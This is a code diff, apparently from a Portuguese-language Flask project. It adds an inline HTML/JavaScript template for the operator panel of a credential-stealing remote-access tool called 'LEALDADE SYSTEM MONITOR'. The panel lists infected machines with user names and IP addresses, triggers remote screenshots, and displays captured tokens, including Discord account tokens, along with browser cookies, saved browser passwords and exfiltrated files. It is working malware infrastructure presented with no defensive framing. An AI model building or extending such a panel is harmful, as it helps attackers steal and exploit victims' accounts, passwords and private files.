@@ -12,14 +12,6 @@ from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-# Carregar template HTML
-try:
-    template_path = os.path.join(os.path.dirname(__file__), 'templates', 'index.html')
-    with open(template_path, 'r', encoding='utf-8') as f:
-        HTML_TEMPLATE = f.read()
-except FileNotFoundError:
-    HTML_TEMPLATE = "<h1>Template não encontrado</h1>"
-
 # CORS manual
 @app.after_request
 def after_request(response):
@@ -39,6 +31,538 @@ endpoint_passwords = {}
 endpoint_files = {}
 full_reports = {}
 uploaded_files = {}
+
+# Template HTML robusto
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LEALDADE SYSTEM MONITOR</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f23;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; margin-bottom: 40px; }
+        .header h1 { 
+            font-size: 3em; 
+            margin-bottom: 10px; 
+            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+        }
+        .header p { color: #9ca3af; font-size: 1.1rem; }
+        
+        .stats-grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
+            gap: 25px; 
+            margin-bottom: 50px;
+        }
+        .stat-card { 
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.1) 0%, rgba(168, 85, 247, 0.1) 100%);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: 16px; 
+            padding: 25px; 
+            text-align: center;
+            backdrop-filter: blur(10px);
+            transition: transform 0.3s ease;
+        }
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.2);
+        }
+        .stat-value { 
+            font-size: 2.5em; 
+            font-weight: 700; 
+            color: #a855f7;
+            margin-bottom: 5px;
+        }
+        .stat-label { color: #9ca3af; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
+        
+        .tabs-container { 
+            display: flex; 
+            margin-bottom: 30px;
+            background: rgba(17, 17, 27, 0.6);
+            border-radius: 12px;
+            padding: 5px;
+        }
+        .tab { 
+            background: transparent; 
+            color: #9ca3af; 
+            border: none; 
+            padding: 15px 25px; 
+            cursor: pointer;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+            flex: 1;
+        }
+        .tab.active { 
+            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
+            color: white;
+            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
+        }
+        .tab:hover:not(.active) { background: rgba(124, 58, 237, 0.1); }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        
+        .cards-grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); 
+            gap: 25px; 
+        }
+        .card { 
+            background: linear-gradient(135deg, rgba(17, 17, 27, 0.8) 0%, rgba(31, 31, 46, 0.8) 100%);
+            border: 1px solid rgba(124, 58, 237, 0.1);
+            border-radius: 16px; 
+            padding: 25px;
+            backdrop-filter: blur(10px);
+            transition: transform 0.3s ease;
+        }
+        .card:hover { transform: translateY(-3px); }
+        .card h3 { 
+            color: #a855f7; 
+            margin-bottom: 20px; 
+            font-size: 1.3rem;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
+        }
+        .card p { margin: 8px 0; color: #e0e0e0; }
+        .card strong { color: #a855f7; }
+        
+        .refresh-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
+            color: white;
+            border: none;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 24px;
+            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.3);
+            transition: transform 0.3s ease;
+        }
+        .refresh-btn:hover { transform: scale(1.1); }
+        
+        .data-section {
+            background: rgba(10, 10, 15, 0.6);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .data-section h3 {
+            color: #a855f7;
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
+        }
+        .token-card, .cookie-card, .password-card {
+            background: rgba(168, 85, 247, 0.1);
+            border: 1px solid rgba(168, 85, 247, 0.2);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 8px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            word-break: break-all;
+        }
+        .screenshot-img {
+            max-width: 100%;
+            border-radius: 12px;
+            border: 2px solid rgba(124, 58, 237, 0.3);
+        }
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: #6b7280;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>LEALDADE SYSTEM MONITOR</h1>
+            <p>Painel de Monitoramento em Tempo Real</p>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value" id="totalEndpoints">0</div>
+                <div class="stat-label">Endpoints</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="onlineEndpoints">0</div>
+                <div class="stat-label">Online</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalMetrics">0</div>
+                <div class="stat-label">Métricas</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalScreenshots">0</div>
+                <div class="stat-label">Screenshots</div>
+            </div>
+        </div>
+
+        <div class="tabs-container">
+            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
+            <button class="tab" onclick="showTab('screenshot')">Screenshot</button>
+            <button class="tab" onclick="showTab('data')">Dados</button>
+        </div>
+        
+        <div id="endpoints" class="tab-content active">
+            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Endpoints Monitorados</h2>
+            <div class="cards-grid" id="endpointsList">
+                <div style="color: #6b7280; text-align: center; padding: 40px;">Carregando...</div>
+            </div>
+        </div>
+
+        <div id="screenshot" class="tab-content">
+            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Screenshot Manual</h2>
+            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
+                <select id="endpointSelect" style="width: 100%; max-width: 400px; padding: 14px; background: rgba(10, 10, 15, 0.8); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 12px; color: #e0e0e0; font-size: 0.95rem; margin-bottom: 20px;" onchange="selectEndpoint()">
+                    <option value="">Selecione um endpoint...</option>
+                </select>
+                <button id="screenshotBtn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 0.9rem; font-weight: 500; margin-bottom: 20px;" onclick="requestScreenshot()" disabled>📸 Capturar Screenshot</button>
+                <div id="screenContent" style="background: rgba(10, 10, 15, 0.9); border-radius: 16px; padding: 20px; text-align: center; min-height: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+                    <div style="color: #6b7280;">Selecione um endpoint</div>
+                </div>
+            </div>
+        </div>
+        
+        <div id="data" class="tab-content">
+            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Menu de Dados</h2>
+            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px;">
+                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('tokens')">🔑 Tokens</button>
+                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('cookies')">🍪 Cookies</button>
+                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('passwords')">🔒 Senhas</button>
+                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('files')">📁 Arquivos</button>
+                </div>
+                
+                <div id="dataContent" style="min-height: 400px;">
+                    <div style="text-align: center; padding: 40px; color: #6b7280;">Selecione uma categoria acima</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button class="refresh-btn" onclick="loadAllData()">🔄</button>
+
+    <script>
+        let currentEndpoint = null;
+        let currentCategory = null;
+
+        function showTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        function showDataCategory(category) {
+            currentCategory = category;
+            const contentDiv = document.getElementById('dataContent');
+            
+            switch(category) {
+                case 'tokens':
+                    loadTokens();
+                    break;
+                case 'cookies':
+                    loadCookies();
+                    break;
+                case 'passwords':
+                    loadPasswords();
+                    break;
+                case 'files':
+                    loadFiles();
+                    break;
+            }
+        }
+
+        async function loadEndpoints() {
+            try {
+                const response = await fetch('/api/endpoints');
+                const endpoints = await response.json();
+                
+                const container = document.getElementById('endpointsList');
+                container.innerHTML = '';
+                
+                Object.values(endpoints).forEach(endpoint => {
+                    const div = document.createElement('div');
+                    div.className = 'card';
+                    div.innerHTML = `
+                        <h3>${endpoint.hostname}</h3>
+                        <p><strong>ID:</strong> ${endpoint.id}</p>
+                        <p><strong>Usuário:</strong> ${endpoint.user}</p>
+                        <p><strong>IP Local:</strong> ${endpoint.ip_address}</p>
+                        <p><strong>IP Externo:</strong> ${endpoint.external_ip}</p>
+                        <p><strong>Plataforma:</strong> ${endpoint.platform}</p>
+                        <p><strong>RAM:</strong> ${endpoint.ram}</p>
+                        <p><strong>Status:</strong> 🟢 Online</p>
+                        <p><strong>Visto:</strong> ${endpoint.last_seen}</p>
+                        <button class="tab" style="margin-top: 15px; padding: 8px 16px;" onclick="requestScreenshot('${endpoint.id}')">📸 Screenshot</button>
+                    `;
+                    container.appendChild(div);
+                });
+                
+                document.getElementById('totalEndpoints').textContent = Object.keys(endpoints).length;
+                document.getElementById('onlineEndpoints').textContent = Object.keys(endpoints).length;
+                
+                // Atualiza o select de endpoints
+                const select = document.getElementById('endpointSelect');
+                select.innerHTML = '<option value="">Selecione um endpoint...</option>';
+                Object.keys(endpoints).forEach(id => {
+                    const option = document.createElement('option');
+                    option.value = id;
+                    option.textContent = `${endpoints[id].hostname} (${id})`;
+                    select.appendChild(option);
+                });
+            } catch (error) {
+                console.error('Error loading endpoints:', error);
+            }
+        }
+
+        async function loadTokens() {
+            try {
+                const response = await fetch('/api/tokens_data');
+                const tokens = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>🔑 Tokens Capturados</h3><div id="tokensList"></div></div>';
+                
+                const tokensList = document.getElementById('tokensList');
+                tokensList.innerHTML = '';
+                
+                Object.entries(tokens).forEach(([endpoint_id, data]) => {
+                    data.tokens.forEach(token => {
+                        const div = document.createElement('div');
+                        div.className = 'token-card';
+                        div.innerHTML = `
+                            <strong>Endpoint:</strong> ${endpoint_id}<br>
+                            <strong>Token:</strong> ${token.token || 'N/A'}<br>
+                            <strong>Válido:</strong> ${token.valid ? '✅' : '❌'}<br>
+                            ${token.account ? `<strong>Usuário:</strong> ${token.account.username}#${token.account.discriminator}<br>` : ''}
+                        `;
+                        tokensList.appendChild(div);
+                    });
+                });
+                
+                if (Object.keys(tokens).length === 0) {
+                    tokensList.innerHTML = '<div class="empty-state">Nenhum token encontrado</div>';
+                }
+            } catch (error) {
+                console.error('Error loading tokens:', error);
+            }
+        }
+
+        async function loadCookies() {
+            try {
+                const response = await fetch('/api/cookies_data');
+                const cookies = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>🍪 Cookies do Navegador</h3><div id="cookiesList"></div></div>';
+                
+                const cookiesList = document.getElementById('cookiesList');
+                cookiesList.innerHTML = '';
+                
+                Object.entries(cookies).forEach(([endpoint_id, data]) => {
+                    data.cookies.forEach(cookie => {
+                        const div = document.createElement('div');
+                        div.className = 'cookie-card';
+                        div.innerHTML = `
+                            <strong>Endpoint:</strong> ${endpoint_id}<br>
+                            <strong>Host:</strong> ${cookie.host}<br>
+                            <strong>Nome:</strong> ${cookie.name}<br>
+                            <strong>Valor:</strong> ${cookie.value.substring(0, 100)}${cookie.value.length > 100 ? '...' : ''}<br>
+                        `;
+                        cookiesList.appendChild(div);
+                    });
+                });
+                
+                if (Object.keys(cookies).length === 0) {
+                    cookiesList.innerHTML = '<div class="empty-state">Nenhum cookie encontrado</div>';
+                }
+            } catch (error) {
+                console.error('Error loading cookies:', error);
+            }
+        }
+
+        async function loadPasswords() {
+            try {
+                const response = await fetch('/api/passwords_data');
+                const passwords = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>🔒 Senhas Salvas</h3><div id="passwordsList"></div></div>';
+                
+                const passwordsList = document.getElementById('passwordsList');
+                passwordsList.innerHTML = '';
+                
+                Object.entries(passwords).forEach(([endpoint_id, data]) => {
+                    data.passwords.forEach(password => {
+                        const div = document.createElement('div');
+                        div.className = 'password-card';
+                        div.innerHTML = `
+                            <strong>Endpoint:</strong> ${endpoint_id}<br>
+                            <strong>Navegador:</strong> ${password.browser}<br>
+                            <strong>URL:</strong> ${password.url}<br>
+                            <strong>Usuário:</strong> ${password.username}<br>
+                            <strong>Senha:</strong> ${password.password}<br>
+                        `;
+                        passwordsList.appendChild(div);
+                    });
+                });
+                
+                if (Object.keys(passwords).length === 0) {
+                    passwordsList.innerHTML = '<div class="empty-state">Nenhuma senha encontrada</div>';
+                }
+            } catch (error) {
+                console.error('Error loading passwords:', error);
+            }
+        }
+
+        async function loadFiles() {
+            try {
+                const response = await fetch('/api/files_data');
+                const files = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>📁 Arquivos Recebidos</h3><div id="filesList"></div></div>';
+                
+                const filesList = document.getElementById('filesList');
+                filesList.innerHTML = '';
+                
+                Object.entries(files).forEach(([endpoint_id, data]) => {
+                    data.files.forEach(file => {
+                        const div = document.createElement('div');
+                        div.className = 'token-card';
+                        div.innerHTML = `
+                            <strong>Endpoint:</strong> ${endpoint_id}<br>
+                            <strong>Nome:</strong> ${file.name || file.filename}<br>
+                            <strong>Tamanho:</strong> ${file.size ? (file.size / 1024).toFixed(2) + ' KB' : 'N/A'}<br>
+                            <strong>Tipo:</strong> ${file.type || file.content_type}<br>
+                        `;
+                        filesList.appendChild(div);
+                    });
+                });
+                
+                if (Object.keys(files).length === 0) {
+                    filesList.innerHTML = '<div class="empty-state">Nenhum arquivo encontrado</div>';
+                }
+            } catch (error) {
+                console.error('Error loading files:', error);
+            }
+        }
+
+        async function loadScreenshots() {
+            try {
+                const response = await fetch('/api/screenshots');
+                const screenshots = await response.json();
+                
+                const container = document.getElementById('screenContent');
+                container.innerHTML = '';
+                
+                Object.entries(screenshots).forEach(([endpoint_id, screenshot]) => {
+                    const div = document.createElement('div');
+                    div.innerHTML = `
+                        <h3 style="color: #a855f7; margin-bottom: 15px;">${endpoint_id}</h3>
+                        <p style="color: #9ca3af; margin-bottom: 15px;"><strong>Data:</strong> ${new Date(screenshot.timestamp).toLocaleString()}</p>
+                        ${screenshot.image ? `<img src="data:image/png;base64,${screenshot.image}" class="screenshot-img" alt="Screenshot">` : ''}
+                    `;
+                    container.appendChild(div);
+                });
+                
+                document.getElementById('totalScreenshots').textContent = Object.keys(screenshots).length;
+                
+                if (Object.keys(screenshots).length === 0) {
+                    container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
+                }
+            } catch (error) {
+                console.error('Error loading screenshots:', error);
+            }
+        }
+
+        function selectEndpoint() {
+            const select = document.getElementById('endpointSelect');
+            currentEndpoint = select.value;
+            const btn = document.getElementById('screenshotBtn');
+            
+            if (currentEndpoint) {
+                btn.disabled = false;
+                btn.style.opacity = '1';
+            } else {
+                btn.disabled = true;
+                btn.style.opacity = '0.5';
+            }
+        }
+
+        async function requestScreenshot(endpointId) {
+            const id = endpointId || currentEndpoint;
+            if (!id) {
+                alert('Selecione um endpoint primeiro');
+                return;
+            }
+            
+            try {
+                const response = await fetch(`/api/request_screenshot/${id}`, { method: 'POST' });
+                const result = await response.json();
+                
+                if (result.status === 'success') {
+                    alert(`Screenshot solicitado para ${id}!`);
+                    setTimeout(() => {
+                        loadScreenshots();
+                        if (currentEndpoint === id) {
+                            selectEndpoint();
+                        }
+                    }, 5000);
+                } else {
+                    alert(`Erro: ${result.message}`);
+                }
+            } catch (error) {
+                console.error('Error requesting screenshot:', error);
+            }
+        }
+
+        function loadAllData() {
+            loadEndpoints();
+            
+            fetch('/api/metrics_data')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('totalMetrics').textContent = data.length;
+                })
+                .catch(error => console.error('Error loading metrics:', error));
+        }
+
+        // Carrega dados iniciais
+        loadAllData();
+        
+        // Atualiza a cada 30 segundos
+        setInterval(loadAllData, 30000);
+    </script>
+</body>
+</html>
+"""
 
 # API Endpoints robustos
 @app.route('/login')
